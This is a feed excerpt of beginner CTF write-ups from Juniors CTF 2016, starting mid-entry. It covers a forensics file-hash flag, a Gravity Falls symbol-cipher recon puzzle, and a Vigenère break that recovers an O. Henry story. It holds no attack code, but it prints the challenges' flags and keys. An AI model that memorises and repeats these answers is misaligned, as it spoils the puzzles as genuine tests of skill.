<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">[noraj@rawsec]––––––––––––––––––––––––[~/CTF/JuniorCTF/2016/Clone-Attack/dipper]</div><div class="line">$ grep -r &apos;Оригинальный Диппер&apos; ./</div><div class="line">Binary file ./atvF2wf1tfB2IkuV.jpg matches</div><div class="line">[noraj@rawsec]––––––––––––––––––––––––[~/CTF/JuniorCTF/2016/Clone-Attack/dipper]</div><div class="line">$ md5sum atvF2wf1tfB2IkuV.jpg</div><div class="line">cd4d19b8471cecbc8ea7544de59db368  atvF2wf1tfB2IkuV.jpg</div></pre></td></tr></table></figure>
<ul>
<li><code>cd4d19b8471cecbc8ea7544de59db368</code> was the flag.</li>
</ul>
<p><img src="https://i.imgbox.com/K5qOYSYB.jpg" alt=""></p>
<p><strong>Feedback</strong>: it’s a international CTF, so please use only english, russian content everywhere is pain for non-russian</p>
]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;Informations&quot;&gt;&lt;a href=&quot;#Informations&quot; class=&quot;headerlink&quot; title=&quot;Informations&quot;&gt;&lt;/a&gt;Informations&lt;/h2&gt;&lt;h3 id=&quot;Version&quot;&gt;&lt;a href=&quot;#Versio
    
    </summary>
    
      <category term="security" scheme="http://rawsec.ml/categories/security/"/>
    
      <category term="writeups" scheme="http://rawsec.ml/categories/security/writeups/"/>
    
    
      <category term="security" scheme="http://rawsec.ml/tags/security/"/>
    
      <category term="writeups" scheme="http://rawsec.ml/tags/writeups/"/>
    
      <category term="ctf" scheme="http://rawsec.ml/tags/ctf/"/>
    
      <category term="forensics" scheme="http://rawsec.ml/tags/forensics/"/>
    
  </entry>
  
  <entry>
    <title>Juniors CTF - 200 - Here goes ! - Recon</title>
    <link href="http://rawsec.ml/en/JuniorCTF-2016-recon-Here-goes/"/>
    <id>http://rawsec.ml/en/JuniorCTF-2016-recon-Here-goes/</id>
    <published>2016-11-26T23:00:00.000Z</published>
    <updated>2016-11-27T22:20:04.912Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Informations"><a href="#Informations" class="headerlink" title="Informations"></a>Informations</h2><h3 id="Version"><a href="#Version" class="headerlink" title="Version"></a>Version</h3><table>
<thead>
<tr>
<th>By</th>
<th>Version</th>
<th>Comment</th>
</tr>
</thead>
<tbody>
<tr>
<td>Chill3d</td>
<td>1.0</td>
<td>Creation</td>
</tr>
</tbody>
</table>
<h3 id="CTF"><a href="#CTF" class="headerlink" title="CTF"></a>CTF</h3><ul>
<li><strong>Name</strong> : Juniors CTF 2016</li>
<li><strong>Website</strong> : <a href="https://juniors.ctf.org.ru/" target="_blank" rel="external">juniors.ctf.org.ru</a></li>
<li><strong>Type</strong> : Online</li>
<li><strong>Format</strong> : Jeopardy</li>
<li><strong>CTF Time</strong> : <a href="https://ctftime.org/event/391" target="_blank" rel="external">link</a></li>
</ul>
<h3 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h3><p>categories: trivial, crypto, recon</p>
<blockquote>
<p><img src="https://i.imgur.com/mXTu7tU.png" alt="https://i.imgur.com/mXTu7tU.png"></p>
</blockquote>
<h3 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h3><p>This challenge was the first crypto challenge of the Junior CTF 2016.<br>First, it’s pretty easy to know that the flag is encoded in shapes in the bottom left of this picture. But the question is, how to translate/decode it ?   </p>
<p>Go on Google Image and proceed at a picture search…</p>
<p>We find this link : <a href="http://gravityfalls.wikia.com/wiki/Nightmare_Head/Gallery" target="_blank" rel="external">http://gravityfalls.wikia.com/wiki/Nightmare_Head/Gallery</a>   </p>
<p>So, this capture come from <code>Gravity Falls</code>… Let’s navigate on the wiki…</p>
<p>A page is talking about a list of cryptogram, interesting :smirk: (<a href="http://gravityfalls.wikia.com/wiki/List_of_cryptograms" target="_blank" rel="external">http://gravityfalls.wikia.com/wiki/List_of_cryptograms</a>)    </p>
<p>Oh ! In Bill’s symbol substitution cipher we find shapes that are on the picture ! (<a href="http://gravityfalls.wikia.com/wiki/List_of_cryptograms#Bill.27s_symbol_substitution_cipher" target="_blank" rel="external">http://gravityfalls.wikia.com/wiki/List_of_cryptograms#Bill.27s_symbol_substitution_cipher</a>).</p>
<p>If we replace shapes by letters we find the following text : <code>FIXPROBLEMQUICKLYWITHGALVANIZEDJETS</code>.</p>
<p>Flag : <code>FIXPROBLEMQUICKLYWITHGALVANIZEDJETS</code> :tada:</p>
]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;Informations&quot;&gt;&lt;a href=&quot;#Informations&quot; class=&quot;headerlink&quot; title=&quot;Informations&quot;&gt;&lt;/a&gt;Informations&lt;/h2&gt;&lt;h3 id=&quot;Version&quot;&gt;&lt;a href=&quot;#Versio
    
    </summary>
    
      <category term="security" scheme="http://rawsec.ml/categories/security/"/>
    
      <category term="writeups" scheme="http://rawsec.ml/categories/security/writeups/"/>
    
    
      <category term="security" scheme="http://rawsec.ml/tags/security/"/>
    
      <category term="writeups" scheme="http://rawsec.ml/tags/writeups/"/>
    
      <category term="ctf" scheme="http://rawsec.ml/tags/ctf/"/>
    
      <category term="reconnaissance" scheme="http://rawsec.ml/tags/reconnaissance/"/>
    
  </entry>
  
  <entry>
    <title>Juniors CTF - 300 - Southern Cross - Cryptography</title>
    <link href="http://rawsec.ml/en/JuniorCTF-2016-crypto-southern-cross/"/>
    <id>http://rawsec.ml/en/JuniorCTF-2016-crypto-southern-cross/</id>
    <published>2016-11-26T23:00:00.000Z</published>
    <updated>2016-11-27T21:54:59.188Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Informations"><a href="#Informations" class="headerlink" title="Informations"></a>Informations</h2><h3 id="Version"><a href="#Version" class="headerlink" title="Version"></a>Version</h3><table>
<thead>
<tr>
<th>By</th>
<th>Version</th>
<th>Comment</th>
</tr>
</thead>
<tbody>
<tr>
<td>noraj</td>
<td>1.0</td>
<td>Creation</td>
</tr>
</tbody>
</table>
<h3 id="CTF"><a href="#CTF" class="headerlink" title="CTF"></a>CTF</h3><ul>
<li><strong>Name</strong> : Juniors CTF 2016</li>
<li><strong>Website</strong> : <a href="https://juniors.ctf.org.ru/" target="_blank" rel="external">juniors.ctf.org.ru</a></li>
<li><strong>Type</strong> : Online</li>
<li><strong>Format</strong> : Jeopardy</li>
<li><strong>CTF Time</strong> : <a href="https://ctftime.org/event/391" target="_blank" rel="external">link</a></li>
</ul>
<h3 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h3><p>categories: crypto</p>
<blockquote>
<ul>
<li>Wow, what’s this, Soos?</li>
<li>It’s the Confederacy’s cipher disk with a help of which southerners encrypted their messages.</li>
<li>How does it work?</li>
<li>Look, Dipper. We need to encode the phrase MABLE EATS SPRINKLES. We don’t need any spaces so just delete them. We get MABLEEATSSPRINKLES. Then we have too choose a key. Let it be GRAVITY. And let’s go !!!</li>
</ul>
<p><a href="https://youtu.be/Fpzrs-fcNKM" target="_blank" rel="external">https://youtu.be/Fpzrs-fcNKM</a></p>
<p>You see, we’ve encrypted the phrase and here it is RBZTXYZJSKZBLQCEN</p>
<ul>
<li>Cool!</li>
<li>Now I’ll encode a famous story and you’ll try to decode it. By the way, it’s much more interesting to read the whole story over, isn’t it?<br>….</li>
<li>That’s complicated. Maybe I have to find a key at first. I’d better look for someone who is able to solve this…</li>
<li>Don’t forget to reach to the end of the text! The ending is greatly important.</li>
</ul>
</blockquote>
<h2 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h2><p>Mmmh, it sounds like polyalphabetic substitution cipher, it looks like Vigenere.</p>
<p>We have additional proofs, title is <code>Southern Cross</code> making a reference to the <code>Confederate cipher disks used in the Civil War</code> [<a href="http://ciphermachines.com/vigenere" target="_blank" rel="external">1</a>].</p>
<p>The ciphertext is:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">UKPVOYDJZPAREJUCQBPCJPBEPZSLOGPBZXGSSDANTFQDPLVTRUOYSOOKBYPWIWRUSCJZSZESDBCERRIPWPSRERTBDOEUVPMIGZOSZNOHRUTLUJUJGZJMMATRITZZDJPAPWOHVSHSQIGJUVLBREIFBZBBOFETZZDTNIWWMOHVGWCMHAEXODTJWVSWYOOHVGSPLDNXICDMWOSUWOJVLCTVLZFDFEGZVVNUBEFIMTVSPCMYCIFSVQIDZBBNIGLVEXZPIBZHRZOXLZNPPLJNKISPVBIEFOYLNHFXSOBCEVOUTVZEIUVCMZRFVBOWMIWJQPADNGJSNMNOWPFOVVNTFHSIOTYFMNIMRZFREPZSVPFTNDCVTGZQHPIFGDMYTYFSYODNVFFHQOHKISTZKOJTWMQGIKJSDBCAKISCIDSVEPZBCHRORDQIAXFGECMEJVQSINATDCXXVNZFGEPZEABQFTVTZPBOWOECMOEBCETSWDXXODNOYLJFJIOCSYOUTCYECONBGWMVDVSCQBCERUHLKFIEHTZZXEKISPVBIEFSCLZSTFBOMYTFUVPOMOLORLVYUEDCFXGEUUVPMIGZOSLVYTVORPZOHVOXZPIBZHRZOKEIDVPLPPFOHSMXORMGAWMTZWSWGCECEHHWBUETIAWITYFSYODNVEFTDZRROREPZFZSSXIIAEEGFOBEJUSOBCAKUVPGMUEUVPMIGZOSQQATPZOCLNANBMLVYTYFFPIRAZUTFZOHVSCCLZRJTVLZFDFEGZVVNUCCMBDDSBZWAXOIOWYOOOGVHDCXHCPKRZVDVPFPINTYFDLANEEHSCAOHIPIRPOHVNWWTNTIVQVWPTWPFEPZRZDVAWXKVUCQBCEVYDCMNSTBFEPZYWPIYLOHVNSDAZNXFFDMMEEFWYBCESFZTMATYBHEPZSLOGPBZXGSSDARAJUOVQIGFOBZBCIEHAZZZSKJAFTVTZOULVYDROUPZJUJUVLVVQLBDFZVWYJZPJJBNBGVVJCBJBRBCIJJRPIJUKPTSQNHVBRHQOHKISMCOTVORZNCIJTWIACOFUSCACAILRZLNOEXODIGRVBRJLJSZOUEPZEOQFPANCRSGLNZWZUVOGIADJHPBCEJBTPMSPCPRPLOOKISECIEFG30000OWTBOCEOYLXUISSYKTTYFDLANEEHSCAOHIVGEBCEZSVPIYSTBGFIGLPPIEWATYFKTVYONTHZTJOBGCCBCEKIIYLZRTMCFLOHVDCYLPCKPFUMMKVEOEBCESFZWZJPVXVTKCSRHUPLYONOZZWNERORFVMEJJGEQIGRUVTAOUXTVLZFDFEGZVVNUCCMBDDSBZWEDTYUVPQMBFPHJQIAJUCFBXAEWODJVGKVAMTZDFVHZNOHVFLAZZSJDOCIIDIBBLEFWRSRWGDNKISTZCIXIVPMGEUCCZBNTFUVPMIGZOSEPZEEHWYMZRJVZWMILPBBRZTBLUKTAZRROHSMZNXJBPIXCFSRTVBTFPFOMMSIBDTLGYRXOJNMODUVPQIEIUHCIDNSVHMMAOIFHSQNWRTONKJMGMWDPZDKISPFKRVTGXMNSVOUPZMETPJPZZDWSCXJJBKJRMIGLJQSCAPAUFFEWIELUFLTDTPKIXXZDFVHZNCIJDOCEDTYBKTVXHVTHPZMIWMSLVYTFPYLBMITLWYBCEXBAPUMJFIBMQBDFHGTBOIEHCYBCETPOWBZNUFFFVRIKUWYOGYDBRPIRRFOUWMVDSZUTDDNXBBTUDTRUWZVJFRUOCOZTROREPZMVTGPVBEIUFFUKEUIWXEDTYBPLTGEOBQETTBVUKPMIHZTGSWPLUFFMTVDVTHSMXRVFYNPZVRMWPZJFZORFAORPSCWTZDFGTEWOHVHFZCIDKIIDQICIFODQIGKISDPVRVPTSQNCFNFLLZSZOHSMGOFUPJWIEJJLEPZATIHHWHICFGQZJMKISEIIKKISPVBIEFSCEVSFSRPZZDKPGEWKTYFFZJWEITKLDZDRESQQVNKBRTMPAEEDWCIGVERZEITYFGEMZPJMCAMDNKPHSMOHZDYHWJDJUVLBGIEFREPZTIBQVNDVVNWYCOEJPTNZVSYJBRBCRFVUSIOHZDYPBJFTIOAIMRRMPCWPGYUHSMHTFPDPVROFEGHPZRVUVCMZHFSGPAREIFHTMYTFMCHPVNXJBRJMAEDVPAJNVXODEVIKJBRNJRAPVYJDGUPUHPJWFVZOVZVVSFTLZBPOWRPOOIEOJIBAZOHSQNAEJALTOHVSCMJZRJEWGMNTVECQAVDUMSLVYBIJRWMVNUTSENMEVUVPGHOLOHPLOHVPHSMMTNPKTBCTYFPLOVCIPGDWIEGPAXMGAEEFZLZFRTHLVYWZUVOQNCIFHTWITYSCFOCTYFTZZZSKBBOCKAGSWXMQACMCYMGYXPFRMCEIFHSMVNZNOWBCAKCCCMWOSUWOJVLCTZTXKEUPBLUJSJZPZCGDVSOYLWRFLSLNJRVMSRBCEPTVZBCIDUVCWPGYUVPPZAUBHZVXERORDIODFXBEWCOCEONWPNTJZZNALZHVEUVDVTSNCMEWPFEPZPIFGPVOBPUVPBJRKVCFAORRJZEPZYYBREZVVVMZPLOHVRIPAOIFOCQBDMVXODVJLFOUPZNOSJUXIIYDJZPAVNUICFZNLRZPPBREVOHSMHAEEHSMNPIZSDBKOJTSEPVTTPIWLAOCMCHACAILRZLNOETVZZNENJHSBMAZMWYOMOGFOYLYRFQDPLWRZEZPXVNKFRLVYCIPDAMYTYBBVNPLCZCQBCEXSODAVLFOUEPZSKSSLUDNKISRWMGVCCMBDDSBZWWKEEFREPZSRDYOZZWFVHOWPBCFVLVYFLMGZNOHVOSLBKATLORMNOWDICZZNTZOYLOHVPBPAVCBPTRWGDRORNPPCBMSOEDTYUVPOGEVPTLKCICEGLGTOLPZOLJUSMSOMXKVEDTZVTVISNIGLVEXZGAUCMMEWYOUTCYGJUJBWOEZCFVZOLJIKZCFOJTRISLLAOIGWYIICZOUEPVTBOCNSNTYFVZZISFGTZNVNPUVTVBIEBFTHJNRXVLBVRVXSRWDNXUCOWVBFVHLPJSJGCCGJUSPPHMVIEUUZBGOEHHZEVIKISCMOHVZZWJZOEPICBMAZMPPNJRVEOJTDGYUWYBCEDPFYQIOYJUFMNSKIOEKVYLTSZNTOLSBWTXAISMOWPBCFTZZVWYJZPIISNFFPLOHVTOYOPIEFPZJRECMOYVZXKISQQMSKBBTUVLNFQZUZATSCDAWYAJBRWZSNFALLZAYBIWLDDEUKPIXCFSRTVOOKISXIMKJPBEPDSDPBPGOHVSSD3000015000IKIVDSTBNSYPFEWAWYBHTMSPVDHPLNAZEGSIMKUPRDWIKZDYTVBSFGHWGVTKISAIXKRHSDEDTYUVPBJEFGVTAWOFUOYLOHVOVPTJOBFRAMISZWSWGVTKISHMOSZESDWAHZTHTZZDYPFDMJLUCCWQQAITATOCTPOWRPKLRZSOWPTYFGLQYSCPKWGDWZTVEPVTJPFCMGOWZCFZNHREBEOJTYVFEAJDFJGLQYBFCVPIMTZMMMCOIKDOYBWEYFZAMYBFMWGIMSXPHATZNKZCQJJTKPASMGLXFHFAWOKITLZZNFVUSBJGVUTCMNHDPIYBNDROUTBNHRSYTKVNKISWXOHZOYTVCONGIYVTIKJGEPVTROSLAOEIOSCTDKVZCFKVNTPAPWPTYFFPIIDXJJPCNWVTHPZIFVMZZENCRSRDIIDJQOOMNIEUVPLZSGFFLLJBLTWYMNSNIOEXVRKPTEPZERTHHINYFVTCWHAEZKLGIENZCCSNTRUSDIDDJIOCSYOUTCYADTKJBRLJWEPBLJJUCESCIIDTISHQIGRUKTODWRTPZZIOEBTLZHIEVZDBZRTPIYBTIIBBLEVYWSCXPJMVXVPVDWRTGPDZNKFSYQOWRTOYIXCZESYBHYTPATVBWVTHTEVSNBZVQIACPBRBCEIPOOEDTYNMNTJTYFGTVVBLORWMHABJBQWMNVXMZZFCZUMTPVDROWOMVOWHCTVOHVSSLVYMRLWYTJTJPTXWIEPJOWEVYJGSWBGIBFWNWPLUECTBDCRNSEWVPCBQPWIEVWSYQIWYFFPBCEIPOONJRBFRLVYIUJRYBFNFXKSQXHWPFVBJTRLSTAOUUJSOIWOLUWENJRYBZQIIHFVFLVYTYFBTBJOBUVPTZFKIOYLOHRUBTOCTZSIYQITFUVPKVMGPTLEDLUXSDBNHFXHSIOWRTHCIQECMWYIHOEHHSMGIKUZPBJWETOYLDWVOHHMNTNJHSQOIMFCQBZNNPBOMMEUJTTEJUCEBEPVVVUICVZDFVHOQAFVSSYBDFZEHZWFTYFCEPZRIPOOWCIIFQVWIYFVRSIQEVORPLPPRCCFBOHVTOXMNAZEPZJOIUCOWTXHVFFQCGLPQVTTJSFQVTKVLZUOTVOTYFFZIYSNFHLSZIKTKSIOSZOGTLZOWVGEPVTDBYPAPSKVFYWPTKISHITWVECDPVRBECOAJNXPHFXVNUMSLVZDRHOTVNTRUFPMDDRHCZLYERMFLBCEIUVLBNOISSWWAYFVFYPVDEUVFZOHZNGPTABFCVPAVIUBULQIACNCDBKAKISEQXACMMDIHEYFFPIBRVFRMWWHVXODAPRVBTTZNTIBHPSDNUPTLKMONCOTBWUKCCWQQAIISWTKUCMIDBCRFVUSIGLIJUSBMETLCYEZDSFHEMMBVNCGQIOEIOOVOWVTVLZFICMPLOOHZTPZWYLVBUTVVNUXSWTCIKUVPBMAZMTZZCIXISCBDMSFFMWWTZEPLTGRVQZLKZDKISDXJICJBEPZBRHOYLOIVEHSMHOLUVZNDTKJUSBGYNJHSIXOIEKSMIHVMCZSZDLQHSMHOJUDCWHIEFBEWWJVDHEPVTYFGLERAJUVPUPZQMSZNNHRSYOWYSFOG45SMGDLQCYPDMNJHSWPTRXOGMMSKPDJWPRWVBYQISRJRMWWWZUVLOMIEXSRWOTFCSSQOTZOHSMWRVFNPAZTJUWWTNAZEGSIMKPPILQITXPWYBJHZUBZJMEVASMWWIYBHPBJTVMZJWPBLUHSMMERJBEIIYTIOYKZFFSPFBJNVPTFAWOCJJLZCEJQZPVOYKJFPLVNUISNIITTBFCGYOLCZPEZBVFBAIMDJNSLVYYFVGSIMKUPRDWIFFSHSZZEPFOCJJBJBWOYPIVUZJEZVVSWDSZDFVFWQQEJUCRMOHVSHTUZAEEORIDNZWSLTRAPTUTDZYFVODYPAIFRPIGAEEWEPJUXIHJWPWRTOXIIIMFVPIMDJPAPYPEVSGEWMIVTOMWPTPPIDPJOKJBZVZOIUKZUZNZOOAMXUCJOCEVYSVHTVZVVSPPTDEMFRPUIONJTJWPRVKIDBCAMJBLTDTKMSQCIWZUVXMNHRSYACOYFVFRCIUGBBOEZLCHSEWIBFMWGIMAEEJLUJSVJTJWPMVBBEWNHFPHDPJOKZCFJGATLVPIMTVEGZVJFRUOCIITLMODPVRBECOAJNJGONMWOIFOOMZPCZGZZMONGIWTJOBZCFLJNKLBZECONCOOQAEVMVPADGYFRLJJUKUVLBNOISSWWAYFVFYJMERLWYPDSCFUMWWTYFSIXMEJTWZVJNUPRDWISWBQPKCAEHSOQIAEJBDBVNKUCZVZOWDCWLAEIPQTBTMZOUWMYWZUVTVZXFSOMTZCLQWOQOYKISDWPLFGHSMHAETVZEZDZUGPTAFFSOXWHEEUZTSZAEFJTTAATFWYBCENJBOWROWBFPXPTRCZPPJUJFHCCGYSPPEQYBRMZHINNVWSCBJHZUHSMWRVFNPIBAZOHSMYEREZJ45WATYFTLTNEWSWPVYCIBQVMYAEETTTGEUUVPOJRXFKTBCAIPOCBCAKUVPEVLCTVFZGEUCONSRIKIWYLDGEBBEMXHFFGLVYBFMWGIMUEDCYAXIFVGLKXODQZTKZSNJTETTBFSSLEVYKISWINTFGHSMCOCESCAPPFGHSMNUETSEMSPIFGDVJTGVHEWOHVTHCMNSFGQLZMYZOUOWPBCFPFBVSJIOCSYOUTCYOVLCPDPLVWRZHSMROFEGDMZMVEHZNVDVGFZUCIJWWPEOHVSSGWGVVSWYPDSIJUSBCAEEHFZIEUUCEPZCLSJPLVRDPTLUVHFHOYGXHRJFSQNSRERWMRAJTHCIIGVMMFXCOCTHPZZDRORSMJPVOSOPDSVZSDIIDJBKSQNFVFHYWOIETHTZMUGTPFBMEJUWYOLUZFHWGJNKISPLBEFGOBCVRKFFPLJABESDSDADUSWTDNXZCFBCAKECOAJNFGHSMAIINCQLJDJPBOMXKVSKLTGSKSSPBWRFLSCAJPVOSOPDSVZSDXZASPRJBCETPBQQYEEUWLTXLVSYHINSKBBOQIGSZVTAXHRJFSMNIKBHTVBTFTDPIFTYFFPEVSRDCYNPSVEVFUJFNISPTNBVMCHIIDKISDMYAKJJPJPZQPTLVZLVDHCQXFROOSMHPVBPZLTSRJROWYSFOPWQIKZOUTUPSKIOGMAACMSYINLVFDTPVDRNCDBMEDBFVIWLVEFPIHWYBHTADTGFOMWYYDSKTTGIRNGDQMOWUFLKTWZMZTIHSZTCFBNIUFVPPVSTPAPBJSVUHWMCIJESLTDNOZNEPZMRSYPBXALHVEPDMJICCBNIIJTJWPRVNSXJZRPFGTZZMVNPPZRHRUWDFTZHVCEMYAKUCOITPVBPZLTOEFSTOCTPGWGMNIIUVPVOHRUGSQNPIJQPMSCLTSXMNAZEDPIWOUZFLBCEIOSCDJUJMMQWMSGFOVQIGFGWEJPTZWSMMZNKBZVQIGKPKTTGIRNGSMNAEPZONMIVORZNTOLSGXZYOUTCYIIDPPIAZVCKJQLTGYYBJPIXOIOSCQIXPAWEPJUXIHJWPMZHVEBCAKJGTBCOLHVEGJUDJUSBIOKSSXMHBVSHSIOHVTCWLTOLUVPAOOTLOE98QAHVTSEBGEJBHEPZMRSYPBKRZDSTBRICMHLSZEMFFJKZNKISSINIEUVPEJRCEOYLCIJICXMOOFUCOMGIMFFEPZSYBFPAOHVFLAZZSJJCYWIDFEGZVNFRDSNPVNXFRTVVNZOGEIITKPCYMJFTPZONZRFDWEGHIEHZPLRIKIWYMSOIBPWMXUGJRTBTTYFGZCGOWUVPUVNJICHMYIKTSWNAOIBAZUZNKMWVMVNVWWWNVCVJBEPZWZORZEJFRSSACOASMSSWPSVISHQGLJFHETZAKPBPMDGYUMQQQEJBWOLJDJPBMWGIMBFNIINFUQLZMYUPIMTZ</div></pre></td></tr></table></figure>
<p>A statistic analysis give us <code>BOLIVOR</code> as KEY, that’s nearly the good one.</p>
<p>At the begining of the clear text we can guess <code>TWENTY MILES</code> so by running a known text attack we found the true KEY: <code>BOLIVAR</code>.</p>
<p>So the clear text is:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">TWENTYMILESWESTOFTUCSONTHESUNSETEXPRESSSTOPPEDATATANKTOTAKEONWATERBESIDESTHEAQUEOUSADDITIONTHEENGINEOFTHATFAMOUSFLYERACQUIREDSOMEOTHERTHINGSTHATWERENOTGOODFORITWHILETHEFIREMANWASLOWERINGTHEFEEDINGHOSEBOBTIDBALLSHARKDODSONANDAQUARTERBREDCREEKINDIANCALLEDJOHNBIGDOGCLIMBEDONTHEENGINEANDSHOWEDTHEENGINEERTHREEROUNDORIFICESINPIECESOFORDNANCETHATTHEYCARRIEDTHESEORIFICESSOIMPRESSEDTHEENGINEERWITHTHEIRPOSSIBILITIESTHATHERAISEDBOTHHANDSINAGESTURESUCHASACCOMPANIESTHEEJACULATIONDOTELLATTHECRISPCOMMANDOFSHARKDODSONWHOWASLEADEROFTHEATTACKINGFORCETHEENGINEERDESCENDEDTOTHEGROUNDANDUNCOUPLEDTHEENGINEANDTENDERTHENJOHNBIGDOGPERCHEDUPONTHECOALSPORTIVELYHELDTWOGUNSUPONTHEENGINEDRIVERANDTHEFIREMANANDSUGGESTEDTHATTHEYRUNTHEENGINEFIFTYYARDSAWAYANDTHEREAWAITFURTHERORDERSSHARKDODSONANDBOBTIDBALLSCORNINGTOPUTSUCHLOWGRADEOREASTHEPASSENGERSTHROUGHTHEMILLSTRUCKOUTFORTHERICHPOCKETOFTHEEXPRESSCARTHEYFOUNDTHEMESSENGERSERENEINTHEBELIEFTHATTHESUNSETEXPRESSWASTAKINGONNOTHINGMORESTIMULATINGANDDANGEROUSTHANAQUAPURAWHILEBOBWASKNOCKINGTHISIDEAOUTOFHISHEADWITHTHEBUTTENDOFHISSIXSHOOTERSHARKDODSONWASALREADYDOSINGTHEEXPRESSCARSAFEWITHDYNAMITETHESAFEEXPLODEDTOTHETUNEOF30000ALLGOLDANDCURRENCYTHEPASSENGERSTHRUSTTHEIRHEADSCASUALLYOUTOFTHEWINDOWSTOLOOKFORTHETHUNDERCLOUDTHECONDUCTORJERKEDATTHEBELLROPEWHICHSAGGEDDOWNLOOSEANDUNRESISTINGATHISTUGSHARKDODSONANDBOBTIDBALLWITHTHEIRBOOTYINASTOUTCANVASBAGTUMBLEDOUTOFTHEEXPRESSCARANDRANAWKWARDLYINTHEIRHIGHHEELEDBOOTSTOTHEENGINETHEENGINEERSULLENLYANGRYBUTWISERANTHEENGINEACCORDINGTOORDERSRAPIDLYAWAYFROMTHEINERTTRAINBUTBEFORETHISWASACCOMPLISHEDTHEEXPRESSMESSENGERRECOVEREDFROMBOBTIDBALLSPERSUADERTONEUTRALITYJUMPEDOUTOFHISCARWITHAWINCHESTERRIFLEANDTOOKATRICKINTHEGAMEMRJOHNBIGDOGSITTINGONTHECOALTENDERUNWITTINGLYMADEAWRONGLEADBYGIVINGANIMITATIONOFATARGETANDTHEMESSENGERTRUMPEDHIMWITHABALLEXACTLYBETWEENHISSHOULDERBLADESTHECREEKCHEVALIEROFINDUSTRYROLLEDOFFTOTHEGROUNDTHUSINCREASINGTHESHAREOFHISCOMRADESINTHELOOTBYONESIXTHEACHTWOMILESFROMTHETANKTHEENGINEERWASORDEREDTOSTOPTHEROBBERSWAVEDADEFIANTADIEUANDPLUNGEDDOWNTHESTEEPSLOPEINTOTHETHICKWOODSTHATLINEDTHETRACKFIVEMINUTESOFCRASHINGTHROUGHATHICKETOFCHAPARRALBROUGHTTHEMTOOPENWOODSWHERETHREEHORSESWERETIEDTOLOWHANGINGBRANCHESONEWASWAITINGFORJOHNBIGDOGWHOWOULDNEVERRIDEBYNIGHTORDAYAGAINTHISANIMALTHEROBBERSDIVESTEDOFSADDLEANDBRIDLEANDSETFREETHEYMOUNTEDTHEOTHERTWOWITHTHEBAGACROSSONEPOMMELANDRODEFASTANDWITHDISCRETIONTHROUGHTHEFORESTANDUPAPRIMEVALLONELYGORGEHERETHEANIMALTHATBOREBOBTIDBALLSLIPPEDONAMOSSYBOULDERANDBROKEAFORELEGTHEYSHOTHIMTHROUGHTHEHEADATONCEANDSATDOWNTOHOLDACOUNCILOFFLIGHTMADESECUREFORTHEPRESENTBYTHETORTUOUSTRAILTHEYHADTRAVELLEDTHEQUESTIONOFTIMEWASNOLONGERSOBIGMANYMILESANDHOURSLAYBETWEENTHEMANDTHESPRYESTPOSSETHATCOULDFOLLOWSHARKDODSONSHORSEWITHTRAILINGROPEANDDROPPEDBRIDLEPANTEDANDCROPPEDTHANKFULLYOFTHEGRASSALONGTHESTREAMINTHEGORGEBOBTIDBALLOPENEDTHESACKDREWOUTDOUBLEHANDFULSOFTHENEATPACKAGESOFCURRENCYANDTHEONESACKOFGOLDANDCHUCKLEDWITHTHEGLEEOFACHILDSAYYOUOLDDOUBLEDECKEDPIRATEHECALLEDJOYFULLYTODODSONYOUSAIDWECOULDDOITYOUGOTAHEADFORFINANCINGTHATKNOCKSTHEHORNSOFFOFANYTHINGINARIZONAWHATAREWEGOINGTODOABOUTAHOSSFORYOUBOBWEAINTGOTLONGTOWAITHERETHEYLLBEONOURTRAILBEFOREDAYLIGHTINTHEMORNINOHIGUESSTHATCAYUSEOFYOURNLLCARRYDOUBLEFORAWHILEANSWEREDTHESANGUINEBOBWELLANNEXTHEFIRSTANIMALWECOMEACROSSBYJINGOESWEMADEAHAULDIDNTWEACCORDINTOTHEMARKSONTHISMONEYTHERES3000015000APIECEITSSHORTOFWHATIEXPECTEDSAIDSHARKDODSONKICKINGSOFTLYATTHEPACKAGESWITHTHETOEOFHISBOOTANDTHENHELOOKEDPENSIVELYATTHEWETSIDESOFHISTIREDHORSEOLDBOLIVARSMIGHTYNIGHPLAYEDOUTHESAIDSLOWLYIWISHTHATSORRELOFYOURSHADNTGOTHURTSODOISAIDBOBHEARTILYBUTITCANTBEHELPEDBOLIVARSGOTPLENTYOFBOTTOMHELLGETUSBOTHFARENOUGHTOGETFRESHMOUNTSDANGITSHARKICANTHELPTHINKINHOWFUNNYITISTHATANEASTERNERLIKEYOUCANCOMEOUTHEREANDGIVEUSWESTERNFELLOWSCARDSANDSPADESINTHEDESPERADOBUSINESSWHATPARTOFTHEEASTWASYOUFROMANYWAYNEWYORKSTATESAIDSHARKDODSONSITTINGDOWNONABOULDERANDCHEWINGATWIGIWASBORNONAFARMINULSTERCOUNTYIRANAWAYFROMHOMEWHENIWASSEVENTEENITWASANACCIDENTMYCOMINGWESTIWASWALKINALONGTHEROADWITHMYCLOTHESINABUNDLEMAKINFORNEWYORKCITYIHADANIDEAOFGOINTHEREANDMAKINLOTSOFMONEYIALWAYSFELTLIKEICOULDDOITICAMETOAPLACEONEEVENINWHERETHEROADFORKEDANDIDIDNTKNOWWHICHFORKTOTAKEISTUDIEDABOUTITFORHALFANHOURANDTHENITOOKTHELEFTHANDTHATNIGHTIRUNINTOTHECAMPOFAWILDWESTSHOWTHATWASTRAVELLINAMONGTHELITTLETOWNSANDIWENTWESTWITHITIVEOFTENWONDEREDIFIWOULDNTHAVETURNEDOUTDIFFERENTIFIDTOOKTHEOTHERROADOHIRECKONYOUDHAVEENDEDUPABOUTTHESAMESAIDBOBTIDBALLCHEERFULLYPHILOSOPHICALITAINTTHEROADSWETAKEITSWHATSINSIDEOFUSTHATMAKESUSTURNOUTTHEWAYWEDOSHARKDODSONGOTUPANDLEANEDAGAINSTATREEIDAGOODDEALRATHERTHATSORRELOFYOURNHADNTHURTHIMSELFBOBHESAID